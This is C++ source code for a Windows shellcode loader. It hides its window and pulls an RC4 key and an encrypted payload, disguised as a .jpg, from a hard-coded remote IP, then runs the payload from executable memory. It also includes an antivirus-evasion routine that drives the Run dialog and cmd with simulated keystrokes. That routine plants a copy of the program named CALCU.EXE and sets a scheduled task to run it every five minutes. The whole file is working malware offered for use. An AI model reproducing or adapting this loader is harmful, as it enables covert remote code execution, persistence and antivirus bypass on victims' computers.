#include "dns.h"
#include <windows.h>  
#include <string>
#include "b64/base64.h"
//#include <string.h>

#include "EsyGet/HttpRequest.h"
#include "Md5/md5.h"
#include <iostream>
#include <time.h>
#include "rc4/ARC4.h"
//#include<direct.h>
//data段可读写  
//#pragma comment(linker, "/section:.data,RWE")   
//不显示窗口  
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
//#pragma comment(linker, "/INCREMENTAL:NO")

const char target[] = "124.72.0.94";

char *ip;
const int  port = 83;
char t_ip[20];
const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
typedef void(__stdcall *CODE) ();
char * shellcode = NULL;
int shellcode_size = 0; 
struct in_addr addr;
typedef PVOID (*M) (DWORD, DWORD, DWORD, DWORD);
typedef LRESULT (*S)(HWND   ,UINT   ,WPARAM ,LPARAM);
typedef BOOL (*P)(HWND   ,UINT   ,WPARAM ,LPARAM );


HWND T = NULL, Run = NULL,hq=NULL;

BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
	char temp1[256], temp2[256];
	::GetWindowText(hWnd, temp1, 255);
	GetClassName(hWnd, temp2, 255);
	//printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2, temp1);
	if (T != NULL && Run != NULL &&strstr(temp1, "Cmd.exe") != NULL) {
		hq = hWnd;
	}
	return true;
}
BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam)
{
	char temp1[256], temp2[256];
	::GetWindowText(hWnd, temp1, 255);
	GetClassName(hWnd, temp2, 255);
	//printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2,temp1);
	if (!strcmp(temp2, "Edit")) {
		//printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2, temp1);
		HWND h = GetParent(hWnd);
		GetClassName(h, temp2, 255);
		if (!strcmp(temp2, "ComboBox")) {
			HWND h2 = GetParent((HWND)h);
			GetClassName(h2, temp2, 255);
			if (!strcmp(temp2, "#32770")) {
				T = hWnd;
				Run = h2;
			}
		}

	}
	return true;
}
void SMG(HWND id, char c) {
	//S SendMessage_ = (S)fpSendMsg;
	SendMessage(id, WM_CHAR, c, 0);
}
void bypass360() {
	char szPath[MAX_PATH];
	memset(szPath, 0, 255);
	GetModuleFileName(NULL, szPath, MAX_PATH);
	MessageBox(0,szPath,szPath,0);
	CopyFile(szPath, "C:\\WINDOWS\\TEMP\\CALCU.EXE", true);
	//S SendMessage_ = (S)fpSendMsg;
	//P PostMessage_ = (P)fpPostMsg;
	keybd_event(VK_LWIN, 0, 0, 0);
	keybd_event('R', 0, 0, 0);
	keybd_event('R', 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
	for (int i = 0; i <= 20000;i++) {
		EnumChildWindows(GetDesktopWindow(), EnumChildProc, 0);
		if (T != NULL && Run != NULL) {
			break;
		}
	}
	if (T == NULL) {
		//printf("t is null");
		return;
	}
	keybd_event(VK_CAPITAL, 0, 0, 0);
	SendMessage(T, WM_CHAR, VK_BACK, 0);
	SendMessage(T, WM_CHAR, 'C', 0);
	SendMessage(T, WM_CHAR, 'm', 0);
	SendMessage(T, WM_CHAR, 'd', 0);
	SendMessage(T, WM_CHAR, VK_SPACE, 0);
	SendMessage(T, WM_CHAR, 13, 0);
	PostMessage(T, WM_KEYDOWN, VK_RETURN, 0);

	//HWND hq = NULL;
	for (int i = 0; i <= 20000; i++) {
		EnumWindows(EnumProc, 0);
		if (hq != NULL) {
			Sleep(100);
			break;
		}
	}
	//printf("cmd:%d\n", hq);
	char a[75] = { 'S','C','H','T','A'
		,'S','K','S',VK_SPACE,'/','C'
		,'R','E','A','T','E',VK_SPACE,'/',
		'S','C',VK_SPACE,'M','I','N',
		'U','T','E',VK_SPACE,'/','M','O',VK_SPACE,
		'5',VK_SPACE,'/','T','N',VK_SPACE,'3','6','0',
		VK_SPACE,'/','T','R',VK_SPACE,'C',':','\\','W','I','N','D','O','W','S','\\','T','E','M','P','\\',
		'C','A','L','C','U','.','E','X','E',VK_SPACE,'/','F',' '
	};
	for (int i = 0; i <= 74; i++) {
		//printf("%c", a[i]);
		SMG(hq, a[i]);
	}
	SendMessage(hq, WM_CHAR, 13, 0);
	char b[5] = { 'e','x','i','t' };
	for (int i = 0; i <= 4; i++) {
		SMG(hq, b[i]);
	}
	//PostMessage(hq, WM_CHAR, 13, 0);

}
void GetIP() {
	
	if (parse_domain(target, t_ip) == false) {
		ip = (char*)target;
	}
	else {
		ip = t_ip;
	}
	

	return;
}

std::string GenerateUri()
{
	time_t myt = time(NULL);
	int key = int(int(myt) / 100);
	std::string u = string(obscure) + std::to_string(key);
	return MD5(u).toStr();
}
void GetShellCodeSize()
{
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/my/get_size");
	std::string body = httpReq.getBody(res);
	shellcode_size = std::atoi(body.c_str());
	
	shellcode = (char *)malloc(shellcode_size);
	
}
std::string GetKey()
{
	GetShellCodeSize();
	
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/"+ GenerateUri());

	std::string body = httpReq.getBody(res);
	return body;
}
void LoadShellCode(char *shellcode)
{
	//HMODULE hDllLib = LoadLibrary("Kernel32.dll");
	//FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
	//M VirtualAlloc_ = (M)*fpFun;
	PVOID p = NULL;
	p = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy_s(p, shellcode_size, shellcode, shellcode_size);
	
	CODE code = (CODE)p;
	code();
	
}

void DecPayload(std::string key)
{
	
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	time_t myt = time(NULL);
	int filename = int(int(myt) / 100);

	std::string res = httpReq.HttpGet("/"+ std::to_string(filename)+".jpg");
	std::string body = httpReq.getBody(res);
	std::string payload = base64_decode(body);
	char * c_payload = (char *)malloc(shellcode_size);
	memcpy_s(c_payload, shellcode_size, payload.c_str(), shellcode_size);
	ARC4 rc4;
	if (key.length() == 0) {
		return;
	}
	rc4.setKey((unsigned char*)key.c_str(), key.length());
	rc4.encrypt(c_payload, shellcode, shellcode_size);

	LoadShellCode(shellcode);
	
}

int main()
{  
	HANDLE hObject = CreateMutex(NULL, FALSE, "BAKABIE");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hObject);
		return FALSE;
	}
	while (TRUE) {
		GetIP();
		bypass360();
		//MessageBoxA(0, ip, ip, 0);
		DecPayload(GetKey());
		
		Sleep(20000);
	}
	
	
    return 0;  
}  